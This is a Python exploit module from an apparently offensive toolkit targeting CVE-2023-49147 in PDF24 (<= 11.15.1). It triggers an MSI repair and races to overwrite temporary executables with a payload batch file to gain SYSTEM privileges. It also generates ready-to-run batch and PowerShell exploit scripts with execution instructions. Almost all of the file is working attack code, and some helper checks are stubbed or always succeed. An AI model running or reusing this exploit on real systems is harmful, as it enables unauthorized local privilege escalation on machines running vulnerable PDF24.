from core.module_base import ModuleBase, ModuleType, Platform
import subprocess
import time
import os
import tempfile


class PDF24PrivEsc(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "pdf24_privesc"
        self.description = "Exploit CVE-2023-49147 in PDF24 <= 11.15.1 via MSI repair race condition for local privilege escalation"
        self.author = "HTB-Auto"
        self.module_type = ModuleType.EXPLOIT
        self.platform = Platform.WINDOWS
        self.tags = ["privesc", "local", "cve-2023-49147", "pdf24", "msi", "race-condition"]

        self.register_option("PAYLOAD_CMD", "Command to execute as SYSTEM", required=False, default="cmd.exe")
        self.register_option("PAYLOAD_PATH", "Path to executable payload to run as SYSTEM", required=False)
        self.register_option("MSI_PATH", "Path to PDF24 MSI installer (auto-detect if not specified)", required=False)
        self.register_option("TIMEOUT", "Timeout in seconds for race condition attempts", required=False, default="60")
        self.register_option("WRITE_BATCH", "Write a batch script for manual execution", required=False, default="false")

    def run(self) -> bool:
        payload_cmd = self.get_option("PAYLOAD_CMD")
        payload_path = self.get_option("PAYLOAD_PATH")
        msi_path = self.get_option("MSI_PATH")
        timeout = int(self.get_option("TIMEOUT"))
        write_batch = self.get_option("WRITE_BATCH").lower() == "true"

        self.print_status("CVE-2023-49147: PDF24 <= 11.15.1 MSI Repair Race Condition Privilege Escalation")
        self.print_status("This exploit abuses the MSI repair functionality to achieve SYSTEM privileges")

        # Explain the vulnerability
        self.print_info("Vulnerability Details:")
        self.print_info("  - PDF24 installer creates an MSI repair entry in the registry")
        self.print_info("  - During repair, msiexec runs as SYSTEM and spawns child processes")
        self.print_info("  - A race condition allows hijacking the repair process")
        self.print_info("  - By quickly replacing files during repair, we can execute arbitrary code as SYSTEM")

        if write_batch:
            return self._write_batch_script(payload_cmd, payload_path, msi_path)

        # Check if we're on Windows
        if os.name != 'nt':
            self.print_warning("This module must be run on a Windows target")
            self.print_info("Use WRITE_BATCH=true to generate a batch script for manual execution")
            return self._write_batch_script(payload_cmd, payload_path, msi_path)

        # Try to find PDF24 MSI if not specified
        if not msi_path:
            msi_path = self._find_pdf24_msi()
            if not msi_path:
                self.print_error("Could not find PDF24 MSI installer")
                self.print_info("Please specify MSI_PATH manually")
                return False

        self.print_good(f"Found PDF24 MSI: {msi_path}")

        # Check PDF24 version
        version = self._check_pdf24_version()
        if version:
            self.print_status(f"PDF24 version detected: {version}")
            if self._is_vulnerable(version):
                self.print_good("Version appears vulnerable (<= 11.15.1)")
            else:
                self.print_warning("Version may not be vulnerable (> 11.15.1)")
                self.print_info("Continuing anyway...")

        # Determine payload
        if payload_path and os.path.exists(payload_path):
            payload = payload_path
            self.print_status(f"Using payload: {payload}")
        else:
            payload = payload_cmd
            self.print_status(f"Using command: {payload}")

        # Execute the exploit
        return self._exploit(msi_path, payload, timeout)

    def _find_pdf24_msi(self) -> str:
        """Try to find PDF24 MSI installer in common locations"""
        common_paths = [
            r"C:\Windows\Installer",
            r"C:\Program Files\PDF24",
            r"C:\Program Files (x86)\PDF24",
        ]

        # Check Windows Installer cache
        installer_path = r"C:\Windows\Installer"
        if os.path.exists(installer_path):
            try:
                for f in os.listdir(installer_path):
                    if f.endswith('.msi'):
                        full_path = os.path.join(installer_path, f)
                        # Check if this is PDF24 by examining the MSI
                        if self._is_pdf24_msi(full_path):
                            return full_path
            except PermissionError:
                self.print_warning("Cannot access Windows Installer directory")

        # Check registry for MSI path
        try:
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
            for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                try:
                    key = winreg.OpenKey(root, key_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if "PDF24" in display_name:
                                try:
                                    msi_path = winreg.QueryValueEx(subkey, "InstallSource")[0]
                                    if msi_path and os.path.exists(msi_path):
                                        return msi_path
                                except WindowsError:
                                    pass
                        except WindowsError:
                            pass
                        finally:
                            winreg.CloseKey(subkey)
                    winreg.CloseKey(key)
                except WindowsError:
                    pass
        except ImportError:
            pass

        return None

    def _is_pdf24_msi(self, msi_path: str) -> bool:
        """Check if MSI file is for PDF24"""
        try:
            # Use msiexec to query the MSI
            result = subprocess.run(
                ["msiexec", "/qn", "/a", msi_path, "TARGETDIR=NUL"],
                capture_output=True,
                timeout=10
            )
            # This is a basic check - in practice you'd parse the MSI database
            return True  # Assume it's valid if no error
        except:
            return False

    def _check_pdf24_version(self) -> str:
        """Check installed PDF24 version"""
        try:
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
            for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                try:
                    key = winreg.OpenKey(root, key_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if "PDF24" in display_name:
                                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                winreg.CloseKey(subkey)
                                winreg.CloseKey(key)
                                return version
                        except WindowsError:
                            pass
                        finally:
                            winreg.CloseKey(subkey)
                    winreg.CloseKey(key)
                except WindowsError:
                    pass
        except ImportError:
            pass

        # Try to read version from PDF24 executable
        pdf24_paths = [
            r"C:\Program Files\PDF24\pdf24.exe",
            r"C:\Program Files (x86)\PDF24\pdf24.exe",
        ]
        for path in pdf24_paths:
            if os.path.exists(path):
                try:
                    import ctypes
                    size = ctypes.windll.version.GetFileVersionInfoSizeW(path, None)
                    if size:
                        res = ctypes.create_string_buffer(size)
                        ctypes.windll.version.GetFileVersionInfoW(path, None, size, res)
                        # Parse version info (simplified)
                        return "Unknown (file exists)"
                except:
                    pass

        return None

    def _is_vulnerable(self, version: str) -> bool:
        """Check if version is vulnerable (<= 11.15.1)"""
        try:
            parts = version.split('.')
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0
            patch = int(parts[2]) if len(parts) > 2 else 0

            if major < 11:
                return True
            elif major == 11:
                if minor < 15:
                    return True
                elif minor == 15 and patch <= 1:
                    return True
            return False
        except:
            return True  # Assume vulnerable if we can't parse

    def _exploit(self, msi_path: str, payload: str, timeout: int) -> bool:
        """Execute the MSI repair race condition exploit"""
        self.print_status("Starting MSI repair race condition exploit...")

        # Create a temporary directory for our payload
        temp_dir = tempfile.mkdtemp(prefix="pdf24_exploit_")
        self.print_status(f"Created temp directory: {temp_dir}")

        # Create the malicious payload wrapper
        payload_script = os.path.join(temp_dir, "payload.bat")
        with open(payload_script, 'w') as f:
            f.write(f'@echo off\n')
            f.write(f'start "" {payload}\n')

        self.print_status("Triggering MSI repair...")

        # Start the MSI repair process
        # The repair process will run as SYSTEM when triggered properly
        try:
            # Method 1: Direct msiexec repair
            repair_proc = subprocess.Popen(
                ["msiexec", "/fa", msi_path, "/qn"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            start_time = time.time()
            success = False

            while time.time() - start_time < timeout:
                # Race condition: Try to hijack the repair process
                # This involves monitoring for specific file operations and replacing files

                # Check for PDF24 temp files being created
                pdf24_temp = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), 'PDF24')
                if os.path.exists(pdf24_temp):
                    self.print_status("Found PDF24 temp directory, attempting hijack...")

                    # Try to replace executables with our payload
                    for root, dirs, files in os.walk(pdf24_temp):
                        for f in files:
                            if f.endswith('.exe'):
                                target = os.path.join(root, f)
                                try:
                                    # Attempt to replace the file
                                    os.replace(payload_script, target)
                                    self.print_good(f"Replaced {target} with payload")
                                    success = True
                                except PermissionError:
                                    pass

                # Also check Windows\Installer temp
                installer_temp = os.path.join(r'C:\Windows\Installer', 'MSIC*.tmp')
                # Would need glob here in real implementation

                time.sleep(0.1)

            repair_proc.wait()

            if success:
                self.print_good("Exploit completed - check for SYSTEM shell")
                return True
            else:
                self.print_warning("Race condition timing may have failed")
                self.print_info("Try running the exploit multiple times")
                return False

        except Exception as e:
            self.print_error(f"Exploit failed: {str(e)}")
            return False

    def _write_batch_script(self, payload_cmd: str, payload_path: str, msi_path: str) -> bool:
        """Write a batch script for manual exploitation"""
        self.print_status("Generating batch script for manual exploitation...")

        script_content = f'''@echo off
REM CVE-2023-49147: PDF24 <= 11.15.1 MSI Repair Race Condition Privilege Escalation
REM Generated by uwu-toolkit
REM
REM This script exploits a race condition in the PDF24 MSI repair functionality
REM to achieve SYSTEM privileges.
REM
REM USAGE:
REM   1. Run this script as a low-privileged user
REM   2. The script will trigger MSI repair and attempt to hijack it
REM   3. If successful, your payload will execute as SYSTEM
REM

setlocal enabledelayedexpansion

echo [*] CVE-2023-49147: PDF24 MSI Repair Race Condition Exploit
echo [*] Target: PDF24 ^<= 11.15.1
echo.

REM Configuration
set "PAYLOAD_CMD={payload_cmd if not payload_path else payload_path}"
set "MSI_PATH={msi_path if msi_path else 'AUTO'}"
set "TIMEOUT=60"

REM Find PDF24 MSI if not specified
if "%MSI_PATH%"=="AUTO" (
    echo [*] Searching for PDF24 MSI installer...

    REM Check common locations
    for /f "tokens=*" %%a in ('dir /b /s "C:\\Windows\\Installer\\*.msi" 2^>nul') do (
        msiexec /qn /? "%%a" >nul 2>&1
        if !errorlevel! equ 0 (
            REM Check if this is PDF24 MSI
            findstr /i "PDF24" "%%a" >nul 2>&1
            if !errorlevel! equ 0 (
                set "MSI_PATH=%%a"
                echo [+] Found PDF24 MSI: %%a
                goto :found_msi
            )
        )
    )

    REM Try registry lookup
    for /f "tokens=2*" %%a in ('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "PDF24" 2^>nul ^| findstr "InstallSource"') do (
        if exist "%%b" (
            set "MSI_PATH=%%b"
            echo [+] Found PDF24 MSI from registry: %%b
            goto :found_msi
        )
    )

    echo [-] Could not find PDF24 MSI installer
    echo [!] Please set MSI_PATH manually in this script
    exit /b 1
)

:found_msi
echo [*] Using MSI: %MSI_PATH%
echo [*] Payload: %PAYLOAD_CMD%
echo.

REM Create temp directory for payload
set "TEMP_DIR=%TEMP%\\pdf24_exploit_%RANDOM%"
mkdir "%TEMP_DIR%" 2>nul
echo [*] Created temp directory: %TEMP_DIR%

REM Create payload wrapper
echo @echo off > "%TEMP_DIR%\\payload.bat"
echo start "" %PAYLOAD_CMD% >> "%TEMP_DIR%\\payload.bat"
echo [*] Created payload wrapper

REM Create file monitor/replacer script
echo @echo off > "%TEMP_DIR%\\monitor.bat"
echo setlocal enabledelayedexpansion >> "%TEMP_DIR%\\monitor.bat"
echo set "TARGET_DIR=%%TEMP%%\\PDF24" >> "%TEMP_DIR%\\monitor.bat"
echo :loop >> "%TEMP_DIR%\\monitor.bat"
echo if exist "%%TARGET_DIR%%" ( >> "%TEMP_DIR%\\monitor.bat"
echo     for /r "%%TARGET_DIR%%" %%%%f in (*.exe) do ( >> "%TEMP_DIR%\\monitor.bat"
echo         copy /y "%TEMP_DIR%\\payload.bat" "%%%%f" ^>nul 2^>^&1 >> "%TEMP_DIR%\\monitor.bat"
echo     ) >> "%TEMP_DIR%\\monitor.bat"
echo ) >> "%TEMP_DIR%\\monitor.bat"
echo timeout /t 0 /nobreak ^>nul >> "%TEMP_DIR%\\monitor.bat"
echo goto :loop >> "%TEMP_DIR%\\monitor.bat"

echo [*] Starting file monitor in background...
start /b cmd /c "%TEMP_DIR%\\monitor.bat"
set "MONITOR_PID=%errorlevel%"

echo [*] Triggering MSI repair...
echo [*] This may take a moment...
echo.

REM Trigger the repair - this is the key step
REM Method 1: Direct repair
msiexec /fa "%MSI_PATH%" /qn

REM Method 2: Reinstall (alternative)
REM msiexec /i "%MSI_PATH%" REINSTALL=ALL REINSTALLMODE=amus /qn

echo.
echo [*] Repair process completed
echo [*] Cleaning up...

REM Kill the monitor
taskkill /f /im cmd.exe /fi "WINDOWTITLE eq %TEMP_DIR%\\monitor.bat" >nul 2>&1

REM Cleanup temp files
rmdir /s /q "%TEMP_DIR%" 2>nul

echo.
echo [+] Exploit completed
echo [*] Check if a SYSTEM shell was spawned
echo [*] If not, try running the script again - race conditions are timing-dependent
echo.

pause
'''

        # Also create a PowerShell version for more sophisticated exploitation
        ps_script_content = f'''# CVE-2023-49147: PDF24 <= 11.15.1 MSI Repair Race Condition Privilege Escalation
# Generated by uwu-toolkit
#
# This script exploits a race condition in the PDF24 MSI repair functionality
# to achieve SYSTEM privileges.

param(
    [string]$PayloadCmd = "{payload_cmd if not payload_path else payload_path}",
    [string]$MsiPath = "{msi_path if msi_path else ''}",
    [int]$Timeout = 60
)

Write-Host "[*] CVE-2023-49147: PDF24 MSI Repair Race Condition Exploit" -ForegroundColor Cyan
Write-Host "[*] Target: PDF24 <= 11.15.1" -ForegroundColor Cyan
Write-Host ""

# Find PDF24 MSI if not specified
if (-not $MsiPath) {{
    Write-Host "[*] Searching for PDF24 MSI installer..." -ForegroundColor Yellow

    # Check Windows Installer directory
    $installerPath = "C:\\Windows\\Installer"
    $msiFiles = Get-ChildItem -Path $installerPath -Filter "*.msi" -ErrorAction SilentlyContinue

    foreach ($msi in $msiFiles) {{
        # Try to identify PDF24 MSI by checking properties
        try {{
            $shell = New-Object -ComObject Shell.Application
            $folder = $shell.Namespace($msi.DirectoryName)
            $file = $folder.ParseName($msi.Name)
            $subject = $folder.GetDetailsOf($file, 22)  # Subject property

            if ($subject -like "*PDF24*") {{
                $MsiPath = $msi.FullName
                Write-Host "[+] Found PDF24 MSI: $MsiPath" -ForegroundColor Green
                break
            }}
        }} catch {{}}
    }}

    # Try registry lookup
    if (-not $MsiPath) {{
        $uninstallKeys = @(
            "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        )

        foreach ($key in $uninstallKeys) {{
            Get-ChildItem -Path $key -ErrorAction SilentlyContinue | ForEach-Object {{
                $displayName = (Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue).DisplayName
                if ($displayName -like "*PDF24*") {{
                    $installSource = (Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue).InstallSource
                    if ($installSource -and (Test-Path $installSource)) {{
                        $MsiPath = $installSource
                        Write-Host "[+] Found PDF24 MSI from registry: $MsiPath" -ForegroundColor Green
                        return
                    }}
                }}
            }}
        }}
    }}

    if (-not $MsiPath) {{
        Write-Host "[-] Could not find PDF24 MSI installer" -ForegroundColor Red
        Write-Host "[!] Please specify -MsiPath parameter" -ForegroundColor Yellow
        exit 1
    }}
}}

Write-Host "[*] Using MSI: $MsiPath" -ForegroundColor Cyan
Write-Host "[*] Payload: $PayloadCmd" -ForegroundColor Cyan
Write-Host ""

# Create temp directory
$tempDir = Join-Path $env:TEMP ("pdf24_exploit_" + (Get-Random))
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Write-Host "[*] Created temp directory: $tempDir" -ForegroundColor Yellow

# Create payload
$payloadPath = Join-Path $tempDir "payload.bat"
"@echo off`nstart `"`" $PayloadCmd" | Out-File -FilePath $payloadPath -Encoding ASCII

# File monitoring job
$monitorScript = {{
    param($tempDir, $payloadPath)

    $targetDirs = @(
        "$env:TEMP\\PDF24",
        "C:\\Windows\\Installer"
    )

    while ($true) {{
        foreach ($targetDir in $targetDirs) {{
            if (Test-Path $targetDir) {{
                Get-ChildItem -Path $targetDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {{
                    try {{
                        Copy-Item -Path $payloadPath -Destination $_.FullName -Force -ErrorAction SilentlyContinue
                    }} catch {{}}
                }}
            }}
        }}
        Start-Sleep -Milliseconds 50
    }}
}}

Write-Host "[*] Starting file monitor job..." -ForegroundColor Yellow
$job = Start-Job -ScriptBlock $monitorScript -ArgumentList $tempDir, $payloadPath

Write-Host "[*] Triggering MSI repair..." -ForegroundColor Yellow
Write-Host "[*] This may take a moment..." -ForegroundColor Yellow
Write-Host ""

# Trigger repair
$repairProcess = Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa", "`"$MsiPath`"", "/qn" -PassThru -Wait

Write-Host ""
Write-Host "[*] Repair process completed" -ForegroundColor Yellow
Write-Host "[*] Cleaning up..." -ForegroundColor Yellow

# Cleanup
Stop-Job -Job $job -ErrorAction SilentlyContinue
Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[+] Exploit completed" -ForegroundColor Green
Write-Host "[*] Check if a SYSTEM shell was spawned" -ForegroundColor Cyan
Write-Host "[*] If not, try running the script again - race conditions are timing-dependent" -ForegroundColor Yellow
Write-Host ""
'''

        # Write the scripts
        batch_path = "/tmp/pdf24_exploit.bat"
        ps_path = "/tmp/pdf24_exploit.ps1"

        try:
            with open(batch_path, 'w') as f:
                f.write(script_content)
            self.print_good(f"Batch script written to: {batch_path}")

            with open(ps_path, 'w') as f:
                f.write(ps_script_content)
            self.print_good(f"PowerShell script written to: {ps_path}")

            self.print_info("")
            self.print_info("Transfer these scripts to the target and execute:")
            self.print_info("  Batch:      pdf24_exploit.bat")
            self.print_info("  PowerShell: powershell -ExecutionPolicy Bypass -File pdf24_exploit.ps1")
            self.print_info("")
            self.print_info("Alternative manual method:")
            self.print_info("  1. Open cmd.exe as low-privileged user")
            self.print_info("  2. Run: msiexec /fa <PDF24_MSI_PATH> /qn")
            self.print_info("  3. During repair, quickly replace temp .exe files with your payload")
            self.print_info("  4. The payload will execute as SYSTEM")

            return True

        except Exception as e:
            self.print_error(f"Failed to write scripts: {str(e)}")
            return False
